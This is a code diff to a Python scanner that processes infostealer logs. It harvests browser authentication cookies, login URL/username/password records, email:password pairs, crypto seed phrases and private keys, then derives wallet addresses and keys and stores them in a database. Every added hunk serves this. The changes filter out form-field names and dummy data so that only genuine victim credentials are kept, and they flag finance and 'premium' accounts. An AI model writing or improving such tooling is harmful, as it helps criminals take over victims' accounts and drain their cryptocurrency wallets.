@@ -1664,21 +1664,43 @@ class EnhancedCryptoUtils:
         }
     
     def validate_seed_phrase(self, phrase):
-        """REAL BIP39 validation"""
+        """REAL BIP39 validation with FORM FIELD FILTERING"""
         if not phrase or not isinstance(phrase, str):
             return False
         
         try:
             words = phrase.strip().lower().split()
             
+            # Must be valid word count
             if len(words) not in [12, 15, 18, 21, 24]:
                 return False
             
+            # Form field name patterns to reject
+            form_field_patterns = [
+                'username', 'password', 'email', 'phone', 'address', 'firstname', 
+                'lastname', 'zipcode', 'cardnumber', 'cvv', 'expiry', 'ssn',
+                'accountnumber', 'routing', 'input', 'field', 'text', 'name',
+                'value', 'placeholder', 'label', 'form', 'button', 'submit'
+            ]
+            
+            # Check if seed contains form field names
+            phrase_lower = ' '.join(words)
+            for pattern in form_field_patterns:
+                if pattern in phrase_lower:
+                    return False
+            
+            # Check for test/dummy data
+            test_patterns = ['test', 'example', 'demo', 'sample', 'fake', 'dummy']
+            if any(test in phrase_lower for test in test_patterns):
+                return False
+            
+            # BIP39 wordlist validation
             if self.mnemo and self.wordlist:
                 for word in words:
                     if word not in self.wordlist:
                         return False
             
+            # BIP39 checksum validation
             if self.mnemo:
                 try:
                     return self.mnemo.check(phrase)
@@ -3996,6 +4018,62 @@ class UltimateProductionScanner:
                             # Extract Private Keys (ALL formats)
                             if opts.get('extract_private_keys', True):
                                 pk_extractor.extract_all_key_formats(file_path)
+                                
+                                # NEW: Convert ALL found private keys to seeds and add to database
+                                for key_type, keys_list in pk_extractor.found_keys.items():
+                                    for key_entry in keys_list:
+                                        try:
+                                            private_key = key_entry.get('key', '')
+                                            if private_key and len(private_key) >= 32:
+                                                # Convert to seed phrase
+                                                result = self.convert_private_key_to_seed(private_key)
+                                                
+                                                if result['success']:
+                                                    seed_phrase = result['seed_phrase']
+                                                    
+                                                    # Validate the seed
+                                                    if self.crypto_utils.validate_seed_phrase(seed_phrase):
+                                                        # Add to database
+                                                        seed_id = self.db.add_seed({
+                                                            'phrase': seed_phrase,
+                                                            'word_count': len(seed_phrase.split()),
+                                                            'is_valid': True,
+                                                            'validation_method': 'BIP39_from_private_key',
+                                                            'source_file': file_path
+                                                        })
+                                                        
+                                                        # Derive addresses for all networks
+                                                        derived = seed_processor_rt.process_seed_realtime(seed_phrase, file_path)
+                                                        
+                                                        if derived:
+                                                            for network, data in derived.items():
+                                                                self.db.add_derived_address({
+                                                                    'seed_id': seed_id,
+                                                                    'network': network,
+                                                                    'address': data['address'],
+                                                                    'private_key': data['private_key'],
+                                                                    'derivation_path': data['derivation_path']
+                                                                })
+                                                                
+                                                                self.db.add_wallet({
+                                                                    'address': data['address'],
+                                                                    'crypto_type': network,
+                                                                    'wallet_source': 'Private_Key_To_Seed_Conversion',
+                                                                    'private_key': data['private_key'],
+                                                                    'seed_phrase': seed_phrase[:30] + '...',
+                                                                    'extraction_method': 'pk_to_seed_derivation',
+                                                                    'is_validated': True,
+                                                                    'source_file': file_path
+                                                                })
+                                                                
+                                                                self.stats['wallets_found'] += 1
+                                                            
+                                                            self.stats['seeds_found'] += 1
+                                                            self.stats['validated_seeds'] += 1
+                                                            status_cb(f"🔄 Converted private key → seed: {seed_phrase.split()[0]}...", "success")
+                                        
+                                        except Exception as conv_error:
+                                            logger.debug(f"PK to seed conversion error: {conv_error}")
                             
                             # Extract wallet addresses from file content
                             self._extract_wallets_from_file(file_path, status_cb)
@@ -4752,11 +4830,44 @@ class UltimateProductionScanner:
             logger.debug(f"Seed extraction error: {e}")
 
     def _process_file_ultimate_realtime(self, file_path, status_cb, seed_processor_rt):
-        """Process file with real-time seed detection and private key extraction"""
+        """Process file with real-time seed detection and private key extraction + NEW STEALER LOG SUPPORT"""
         try:
             content = self._read_file_safe(file_path)
             if not content:
                 return
+            
+            filename = os.path.basename(file_path).lower()
+            
+            # NEW: Extract cookies from Netscape format (cookie_list.txt, Browser/Cookies/*.txt)
+            if 'cookie' in filename or 'Browser/Cookies' in file_path:
+                cookies = self.extract_cookies_netscape(content)
+                for cookie in cookies:
+                    # Store in database (you may need to add cookie table or use existing)
+                    self.stats['cookies_found'] += 1
+                    if cookie['type'] == 'authentication':
+                        status_cb(f"🍪 Found auth cookie: {cookie['name']} from {cookie['domain']}", "success")
+            
+            # NEW: Extract logins from Browser/Logins/*.txt files
+            if 'login' in filename or 'Browser/Logins' in file_path or 'password' in filename:
+                logins = self.extract_logins_from_stealer(content)
+                for login in logins:
+                    self.db.add_credential({
+                        'browser': 'unknown',
+                        'profile': 'unknown',
+                        'url': login['url'],
+                        'email': login['username'],
+                        'password': login['password'],
+                        'website': login['url'],
+                        'is_crypto': login['category'] == 'finance',
+                        'is_premium': False,
+                        'has_sms_gateway': False,
+                        'smtp_validated': False,
+                        'imap_validated': False,
+                        'source_file': file_path
+                    })
+                    self.stats['credentials_found'] += 1
+                    if login['category'] in ['social', 'gaming', 'finance']:
+                        status_cb(f"🔑 Found {login['category']} login: {login['username']}", "success")
             
             # Extract seeds with real-time processing
             seeds = self.crypto_utils.extract_seed_phrases_from_text(content)
@@ -5545,52 +5656,103 @@ class UltimateProductionScanner:
     
     
     def _extract_credentials_aggressive(self, content, file_path):
-        """ULTRA-AGGRESSIVE credential extraction - find ALL email:password pairs"""
+        """ULTRA-AGGRESSIVE credential extraction with FORM FIELD FILTERING"""
         credentials = []
         
-        # Pattern 1: email:password format
+        # Form field name blacklist (these are NOT real passwords)
+        form_field_blacklist = [
+            'password', 'passwd', 'pass', 'pwd', 'username', 'user', 'email', 'mail',
+            'login', 'loginfmt', 'userid', 'member_first_name', 'nameOnCard',
+            'shippingName', 'registrationEmail', 'login_email', 'userName',
+            'offerAmount', 'policyNumber', 'majorWeight', 'text-', 'kl-consent',
+            'roompicker', 'sgE-', 'txtZipcode', 'q9_', 'seventhCtrl', 'input',
+            'field', 'form', 'name', 'value', 'placeholder', 'label'
+        ]
+        
+        # Helper function to validate password
+        def is_valid_password(password):
+            if not password or len(password) < 4:
+                return False
+            
+            password_lower = password.lower()
+            
+            # Check if password is a form field name
+            for field in form_field_blacklist:
+                if field in password_lower:
+                    # Allow if it's a long password with special chars (might contain the word but be real)
+                    if len(password) < 30 and not any(c in password for c in ['@', '!', '#', '$', '%', '^', '&', '*']):
+                        return False
+            
+            # Check for test data
+            test_patterns = ['test', 'example', '12345', 'qwerty', 'password123']
+            if any(pattern in password_lower for pattern in test_patterns):
+                if len(password) < 15:  # Short test passwords rejected
+                    return False
+            
+            return True
+        
+        # Pattern 1: Stealer log format (URL / Username / Password)
+        stealer_pattern = r'URL:\s*([^\n]+)\s*(?:Username|Login):\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*Password:\s*([^\n]+)'
+        stealer_matches = re.findall(stealer_pattern, content, re.IGNORECASE | re.MULTILINE)
+        for url, email, password in stealer_matches:
+            password = password.strip()
+            if is_valid_password(password):
+                credentials.append({
+                    'email': email.strip(),
+                    'password': password,
+                    'url': url.strip(),
+                    'source_file': file_path,
+                    'category': self._categorize_email(email),
+                    'is_crypto': self._is_crypto_site(email),
+                    'is_premium': self._is_premium_email(email)
+                })
+        
+        # Pattern 2: email:password format
         pattern1 = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[\s:,;|]+([^\s\n]{4,100})'
         matches = re.findall(pattern1, content)
         for email, password in matches:
-            credentials.append({
-                'email': email,
-                'password': password,
-                'url': '',
-                'source_file': file_path,
-                'category': self._categorize_email(email),
-                'is_crypto': self._is_crypto_site(email),
-                'is_premium': self._is_premium_email(email)
-            })
+            if is_valid_password(password):
+                credentials.append({
+                    'email': email,
+                    'password': password,
+                    'url': '',
+                    'source_file': file_path,
+                    'category': self._categorize_email(email),
+                    'is_crypto': self._is_crypto_site(email),
+                    'is_premium': self._is_premium_email(email)
+                })
         
-        # Pattern 2: JSON format {"email": "...", "password": "..."}
+        # Pattern 3: JSON format {"email": "...", "password": "..."}
         json_pattern = r'"(?:email|user|username)"[\s:]+(?:")?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?:")?,?\s*"(?:password|pass|pwd)"[\s:]+(?:")?([^\s"]{4,100})'
         json_matches = re.findall(json_pattern, content, re.IGNORECASE)
         for email, password in json_matches:
-            credentials.append({
-                'email': email,
-                'password': password,
-                'url': '',
-                'source_file': file_path,
-                'category': self._categorize_email(email),
-                'is_crypto': self._is_crypto_site(email),
-                'is_premium': self._is_premium_email(email)
-            })
+            if is_valid_password(password):
+                credentials.append({
+                    'email': email,
+                    'password': password,
+                    'url': '',
+                    'source_file': file_path,
+                    'category': self._categorize_email(email),
+                    'is_crypto': self._is_crypto_site(email),
+                    'is_premium': self._is_premium_email(email)
+                })
         
-        # Pattern 3: URL with credentials https://user:pass@host or user@host:pass
+        # Pattern 4: URL with credentials https://user:pass@host or user@host:pass
         url_pattern = r'(?:https?://)?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[\s:]+([^\s\n]{4,100})'
         url_matches = re.findall(url_pattern, content)
         for email, password in url_matches:
-            credentials.append({
-                'email': email,
-                'password': password,
-                'url': '',
-                'source_file': file_path,
-                'category': self._categorize_email(email),
-                'is_crypto': self._is_crypto_site(email),
-                'is_premium': self._is_premium_email(email)
-            })
+            if is_valid_password(password):
+                credentials.append({
+                    'email': email,
+                    'password': password,
+                    'url': '',
+                    'source_file': file_path,
+                    'category': self._categorize_email(email),
+                    'is_crypto': self._is_crypto_site(email),
+                    'is_premium': self._is_premium_email(email)
+                })
         
-        # Pattern 4: Line-by-line (common in stealer logs)
+        # Pattern 5: Line-by-line (common in stealer logs)
         lines = content.split('\n')
         for i in range(len(lines) - 1):
             # Check if line has email
@@ -5603,17 +5765,18 @@ class UltimateProductionScanner:
                         # Extract password from this line
                         pwd_match = re.search(r'[\s:=]+([^\s\n]{4,100})', lines[j])
                         if pwd_match:
-                            password = pwd_match.group(1)
-                            credentials.append({
-                                'email': email,
-                                'password': password,
-                                'url': '',
-                                'source_file': file_path,
-                                'category': self._categorize_email(email),
-                                'is_crypto': self._is_crypto_site(email),
-                                'is_premium': self._is_premium_email(email)
-                            })
-                            break
+                            password = pwd_match.group(1).strip()
+                            if is_valid_password(password):
+                                credentials.append({
+                                    'email': email,
+                                    'password': password,
+                                    'url': '',
+                                    'source_file': file_path,
+                                    'category': self._categorize_email(email),
+                                    'is_crypto': self._is_crypto_site(email),
+                                    'is_premium': self._is_premium_email(email)
+                                })
+                                break
         
         # Return unique credentials
         unique = []
